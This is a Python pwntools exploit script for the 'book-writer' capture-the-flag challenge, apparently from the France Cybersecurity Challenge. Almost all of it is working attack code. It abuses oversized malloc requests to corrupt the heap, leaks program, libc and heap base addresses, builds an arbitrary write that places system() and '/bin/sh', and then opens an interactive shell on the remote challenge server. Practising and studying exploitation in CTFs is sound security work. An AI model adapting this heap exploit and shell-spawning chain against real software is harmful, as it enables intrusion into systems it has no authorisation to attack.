#!/usr/bin/python3.9
from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./book-writer_patched') #FIXME
    libc = ELF('./libc-2.36.so') #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = elfexe.path
    if args.REMOTE:
        remote_server = 'challenges.france-cybersecurity-challenge.fr'   #FIXME
        remote_port = 2112         #FIXME

        if args.SSH:
            s = ssh('app-systeme-ch8', remote_server, remote_port, 'app-systeme-ch8')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *write_page
# b *main+876
# b *main+505
# b *get_cmd
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
io = start(arguments)

# Create Book 1
io.sendline(b'1')
io.sendline(b'hello')
# Trigger malloc(0)
io.sendline(b'9223372036854775808')

# Create Book 1
io.sendline(b'1')
io.sendline(b'padding')
# Trigger malloc(0)
io.sendline(b'9223372036854775808')


# Create Book 2
io.sendline(b'1')
io.sendline(b'target')
io.sendline(b'1')

# Create Book 3
io.sendline(b'1')
io.sendline(b'leaker')
# Trigger malloc() crash
io.sendline(b'16777216')

# Create Book 4
io.sendline(b'1')
io.sendline(b'binsh')
# Trigger malloc() crash
io.sendline(b'1')

# Pick book 1
io.sendline(b'2')
io.sendline(b'0')

# Leak PIE
io.sendline(b'4')
res = io.recvuntil(b'target')
res = io.recvuntil(b'target')
res = io.recvuntil(b'padding')
leaked_write = u64(res[:-7][-8:])
elfexe.address = leaked_write-elfexe.sym['write_page']
print("BASE Address:", hex(elfexe.address))
libc_leak_string = elfexe.bss() - 0x1e40

###########################################################
# Prepare LIBC Leak
io.sendline(b'5')
io.sendline(b'5')

payload = b''
payload += p64(elfexe.got['puts'])

# Exploit overflow
io.sendline(b'3')
io.sendline(payload)

# Pick book 2
io.sendline(b'2')
io.sendline(b'2')

# Leak LIBC
io.sendline(b'4')

# Clear STDOUT
res = io.recvuntil(b'Quitter\n')
res = io.recvuntil(b'Quitter\n')
res = io.recvuntil(b'Quitter\n')
res = io.recvuntil(b'Quitter\n')
res = io.recvuntil(b'Quitter\n')
res = io.recvline()
leak_libc = u64(res[1:9])
libc.address = leak_libc-libc.sym['puts']
print("LIBC Address:", hex(libc.address))

############################################################

malloc_hook = libc.address + 0x1d9440
print("DATA Section:", hex(elfexe.bss()))



io.sendline(b'2')
io.sendline(b'0')

###########################################################
# Prepare HEAP Leak

# Leak LIBC
io.sendline(b'4')

# Clear STDOUT
res = io.recvuntil(b'Quitter\n')
res = io.recvuntil(b'Quitter\n')
res = io.recvline()
print(res[113:121])
heap_libc = u64(res[113:121])
heap_base = heap_libc-0x17c0
print("HEAP Address:", hex(heap_base))

############################################################

# Pick book 1
io.sendline(b'2')
io.sendline(b'0')

payload = b''
payload += b'A'*32
payload += b'/bin/sh'

# Exploit overflow
io.sendline(b'3')
io.sendline(payload)



# Pick book 1
io.sendline(b'2')
io.sendline(b'0')

io.sendline(b'5')
io.sendline(b'5')

# Write system
payload = b''
payload += p64(heap_base+0x1758)

# Exploit system
io.sendline(b'3')
io.sendline(payload)

# Pick book 1
io.sendline(b'2')
io.sendline(b'2')

payload = b''
payload += p64(libc.sym['system'])

# Exploit overflow
io.sendline(b'3')
io.sendline(payload)

# Pick book 1
io.sendline(b'2')
io.sendline(b'1')


io.sendline(b'3')
io.sendline(b'3')

io.interactive()
io.close()







######## NOTES ###############
# Arbitrary Write:
#   * Overwrite content ptr
#   * Call write_page
##############################
